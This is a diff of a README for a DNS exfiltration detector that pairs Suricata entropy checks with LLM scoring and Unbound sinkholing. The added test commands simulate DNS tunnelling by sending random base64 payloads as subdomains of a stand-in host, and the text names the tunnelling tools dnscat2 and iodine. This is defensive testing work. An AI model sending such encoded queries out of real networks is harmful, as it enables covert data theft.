@@ -40,8 +40,9 @@ This directory contains end-to-end evidence validating the deployment, signal he
 
 ### Multi-Process Pipeline Topology
 The pipeline runs two decoupled worker processes communicating over an in-memory queue (`multiprocessing.Queue`) to maintain wire-speed processing:
-* **The Sieve (Process 1):** Attaches to the active EVE JSON stream in `/tmp/ramdisk/eve-dns.json`. Calculates Shannon entropy $H(X)$, evaluates label length, strips protocol prefixes (RFC validation records), drops hyphenated cloud infrastructure hostnames, and executes pre-queue apex debouncing.
-* **The Arbiter (Process 2):** Consumes flagged candidate frames. Compiles query telemetry, sends structured decision payloads to OpenRouter (`inception/mercury-decide:free`), parses single-value confidence probabilities ($P(\text{Exfil})$), and executes dynamic sinkholing commands via `unbound-control`.
+* **The Sieve (Process 1):** Attaches to the active EVE JSON stream in `/tmp/ramdisk/eve-dns.json`. Calculates Shannon entropy $H(X)$, evaluates label length, strips RFC metadata prefixes (`_dmarc`, `_domainkey`), drops hyphenated cloud infrastructure hostnames, and runs an LRU debounce cache to suppress burst queries.
+* **The Arbiter (Process 2):** Consumes flagged candidate frames. Compiles query telemetry, sends structured decision payloads to OpenRouter (`inception/mercury-decide:free`), parses single-value confidence probabilities **P(Exfil) >= 0.75**, and executes dynamic sinkholing commands via `unbound-control`.
+
 
 ### Dual-Path Detection Heuristics
 Because attacker tradecraft differs between high-volume IP address lookups and data-dense tunneling protocols (`dnscat2`, `iodine`), the Sieve implements differentiated gating logic:
@@ -55,7 +56,10 @@ Because attacker tradecraft differs between high-volume IP address lookups and d
 ```math
 H \(= -\sum P(x) \log_2\) P(x)
 ```
-
+### Semantic Arbitration (LLM vs. Static Entropy)
+Static threshold gates flag all high-entropy strings uniformly, causing false positives on base64 test strings. The LLM evaluates semantic byte structure:
+* **Plaintext ASCII in Base64 (`VGhpcyBpcy...`):** $H = 4.289$, length 32. Model decodes "This is a test exfil txt", recognizes human test grammar, and outputs $P = 0.4073$ (below 0.75 threshold; bypasses sinkhole).
+* **Encrypted Binary Payload:** $H = 4.562$, length 32. Model identifies unstructured, pseudorandom byte streams targeting an unauthorized apex and outputs $P = 0.9890$ (containment applied).
 
 ### Dynamic Containment Sequence
 When the model returns **P(Exfil) >= 0.75**, the Arbiter injects containment rules directly into Unbound's running in-memory tree:
@@ -67,42 +71,105 @@ unbound-control -c /var/unbound/unbound.conf local_zone intruder.internal redire
 unbound-control -c /var/unbound/unbound.conf local_data "intruder.internal A 127.0.0.1"
 
 ```
+## 4. Test Harness & Reproduction Commands
 
+### Benign Baseline Verification
+
+```powershell
+Resolve-DnsName -Name "_dmarc.intruder.internal" -Type TXT
+```
+
+### Burst Debounce Test (5 rapid queries)
+
+```powershell
+1..5 | ForEach-Object {
+    $bytes = [byte[]](1..24 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
+    $b64 = [Convert]::ToBase64String($bytes).Replace('+', 'A').Replace('/', 'B').Replace('=', '')
+    Resolve-DnsName -Name "$b64.intruder.internal" -ErrorAction SilentlyContinue
+}
+
+```
+
+### Semantic vs. Malicious Payload Test
+
+```powershell
+# Plaintext ASCII Base64 (Semantic pass - No sinkhole):
+Resolve-DnsName -Name "VGhpcyBpcyBhIHRlc3QgZXhmaWwgdHh0.intruder.internal" -Type TXT
+
+# Raw Binary Ciphertext (Malicious - Triggers 127.0.0.1 sinkhole):
+$bytes = [byte[]](1..24 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
+$b64 = [Convert]::ToBase64String($bytes).Replace('+', 'A').Replace('/', 'B').Replace('=', '')
+Resolve-DnsName -Name "$b64.intruder.internal" -Type TXT
+
+```
 ---
 
-## 4. Operational Considerations & System Recovery Runbook
+## 5. Operational Considerations & System Recovery Runbook
+
+### Service Daemonization (`rc.d`)
+
+To run the pipeline as a persistent background daemon, deploy `/usr/local/etc/rc.d/dns_pipeline`:
+
+```sh
+#!/bin/sh
+# PROVIDE: dns_pipeline
+# REQUIRE: suricata unbound
+# KEYWORD: shutdown
+
+. /etc/rc.subr
+
+name="dns_pipeline"
+rcvar="dns_pipeline_enable"
+pidfile="/var/run/${name}.pid"
+command="/usr/sbin/daemon"
+procname="/usr/local/bin/python3"
+script="/root/opnsense/dns-exfil/dns_pipeline.py"
+command_args="-c -f -p ${pidfile} ${procname} ${script} --audit-file /var/log/sinkhole_audit.log"
+
+load_rc_config $name
+: ${dns_pipeline_enable:="NO"}
+run_rc_command "$1"
+
+```
+
+Enable and start the service:
+
+```bash
+chmod +x /usr/local/etc/rc.d/dns_pipeline
+sysrc dns_pipeline_enable="YES"
+service dns_pipeline start
+
+```
 
 ### Service Restart & State Volatility
 
-Dynamic local zones applied via `unbound-control` exist strictly in Unbound's in-memory zone table. If the `unbound` service or the OPNsense firewall restarts:
+Dynamic local zones applied via `unbound-control` exist strictly in memory. If Unbound or OPNsense restarts:
 
-1. Active dynamic redirects are cleared.
-2. The Arbiter's deduplication set automatically repopulates existing quarantined zones on initialization via `unbound-control list_local_zones`.
-3. If an infected endpoint issues subsequent exfiltration bursts, the Sieve catches the query and re-triggers immediate mitigation.
+1. Dynamic redirects are cleared from Unbound's zone table.
+
+
+2. On pipeline initialization, the Arbiter executes `unbound-control list_local_zones` to repopulate existing quarantined zones into memory.
+
+
+3. Any subsequent exfiltration query from a persistent client is immediately caught and re-sinkholed by the Sieve.
+
+
 
 ### RAM Disk & File Descriptor Re-Hook Protocol
 
-If `/tmp/ramdisk` is unmounted or recreated during maintenance, Suricata loses its open file descriptor to `eve-dns.json`. Execute the following sequence to restore telemetry flow:
+If `/tmp/ramdisk` is unmounted during maintenance, Suricata loses its file descriptor to `eve-dns.json`. Restore telemetry flow using:
 
-1. **Recreate Volatile Mount & Staging File:**
 ```bash
+# 1. Recreate volatile mount & staging file
 mkdir -p /tmp/ramdisk
 mount -t tmpfs -o size=64M,mode=0755 tmpfs /tmp/ramdisk
 touch /tmp/ramdisk/eve-dns.json
 chmod 666 /tmp/ramdisk/eve-dns.json
 
-```
-
-
-2. **Re-Hook Suricata Process:**
-```bash
+# 2. Re-hook Suricata engine
 pluginctl -s suricata restart
 
-```
-
-
-3. **Verify Active Stream:**
-```bash
+# 3. Verify active stream
 tail -f /tmp/ramdisk/eve-dns.json
 
 ```
